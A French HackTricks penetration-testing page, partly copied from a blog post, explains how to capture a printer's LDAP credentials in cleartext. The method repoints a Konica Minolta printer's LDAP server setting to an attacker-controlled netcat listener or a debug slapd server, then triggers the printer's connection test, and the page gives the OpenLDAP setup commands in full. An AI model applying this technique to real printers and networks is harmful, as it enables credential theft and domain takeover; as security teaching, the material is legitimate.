<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

D'autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Plusieurs blogs sur Internet **soulignent les dangers de laisser des imprimantes configurées avec LDAP avec des identifiants de connexion par défaut/faibles**.\
Cela est dû au fait qu'un attaquant pourrait **tromper l'imprimante pour qu'elle s'authentifie contre un serveur LDAP malveillant** (typiquement, un `nc -vv -l -p 444` suffit) et pour capturer les **identifiants de l'imprimante en clair**.

De plus, plusieurs imprimantes contiendront des **journaux avec des noms d'utilisateur** ou pourraient même être capables de **télécharger tous les noms d'utilisateur** du Contrôleur de Domaine.

Toutes ces **informations sensibles** et le **manque de sécurité** commun rendent les imprimantes très intéressantes pour les attaquants.

Quelques blogs sur le sujet :

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**Les informations suivantes ont été copiées de** [**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/)

# Paramètres LDAP

Sur les imprimantes Konica Minolta, il est possible de configurer un serveur LDAP pour se connecter, ainsi que des identifiants. Dans les versions antérieures du firmware de ces appareils, j'ai entendu dire qu'il était possible de récupérer les identifiants simplement en lisant le code source html de la page. Maintenant, cependant, les identifiants ne sont pas retournés dans l'interface, donc nous devons travailler un peu plus.

La liste des serveurs LDAP se trouve sous : Réseau > Paramètre LDAP > Configuration LDAP

L'interface permet de modifier le serveur LDAP sans ressaisir les identifiants qui seront utilisés pour se connecter. Je suppose que c'est pour une expérience utilisateur plus simple, mais cela donne l'opportunité à un attaquant d'escalader de maître d'une imprimante à un point d'ancrage sur le domaine.

Nous pouvons reconfigurer l'adresse du serveur LDAP à une machine que nous contrôlons et déclencher une connexion avec la fonctionnalité utile "Test de connexion".

# Écoute des biens

## netcat

Si vous avez plus de chance que moi, vous pourriez vous en sortir avec un simple écouteur netcat :
```
sudo nc -k -v -l -p 386
```
Je suis assuré par [@\_castleinthesky](https://twitter.com/\_castleinthesky) que cela fonctionne la plupart du temps, cependant je n'ai pas encore eu cette chance.

## Slapd

J'ai découvert qu'un serveur LDAP complet est nécessaire car l'imprimante tente d'abord une liaison nulle puis interroge les informations disponibles, et ce n'est que si ces opérations réussissent qu'elle procède à la liaison avec les identifiants.

J'ai cherché un serveur ldap simple qui répondait aux exigences, mais les options semblaient limitées. Finalement, j'ai choisi de configurer un serveur ldap ouvert et d'utiliser le service de serveur de débogage slapd pour accepter les connexions et imprimer les messages de l'imprimante. (Si vous connaissez une alternative plus simple, je serais heureux de l'entendre)

### Installation

(Notez que cette section est une version légèrement adaptée du guide ici [https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap) )

Depuis un terminal root :

**Installez OpenLDAP,**
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**Définir un mot de passe administrateur OpenLDAP (vous en aurez à nouveau besoin sous peu)**
```
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**Importer des schémas de base**
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**Définissez votre nom de domaine sur la base de données LDAP.**
```
# generate directory manager's password
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**Configurer LDAP TLS**

**Créer un certificat SSL**
```
#> cd /etc/pki/tls/certs
#> make server.key
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**Configurer Slapd pour SSL/TLS**
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**Autoriser LDAP à travers votre pare-feu local**
```
firewall-cmd --add-service={ldap,ldaps}
```
## La récompense

Une fois que vous avez installé et configuré votre service LDAP, vous pouvez le lancer avec la commande suivante :

> ```
> slapd -d 2
> ```

La capture d'écran ci-dessous montre un exemple de sortie lorsque nous exécutons le test de connexion sur l'imprimante. Comme vous pouvez le voir, le nom d'utilisateur et le mot de passe sont transmis du client LDAP au serveur.

![sortie du terminal slapd contenant le nom d'utilisateur "MyUser" et le mot de passe "MyPassword"](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# Quelle peut être l'ampleur des dégâts ?

Cela dépend beaucoup des identifiants qui ont été configurés.

Si le principe du moindre privilège est suivi, alors vous ne pourriez obtenir qu'un accès en lecture à certains éléments de l'Active Directory. Cela reste souvent précieux car vous pouvez utiliser ces informations pour formuler des attaques plus précises et efficaces.

Typiquement, vous pourriez obtenir un compte dans le groupe des Utilisateurs du Domaine qui peut donner accès à des informations sensibles ou constituer l'authentification préalable pour d'autres attaques.

Ou, comme moi, vous pourriez être récompensé pour avoir mis en place un serveur LDAP et vous voir remettre un compte d'Admin du Domaine sur un plateau d'argent.


<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
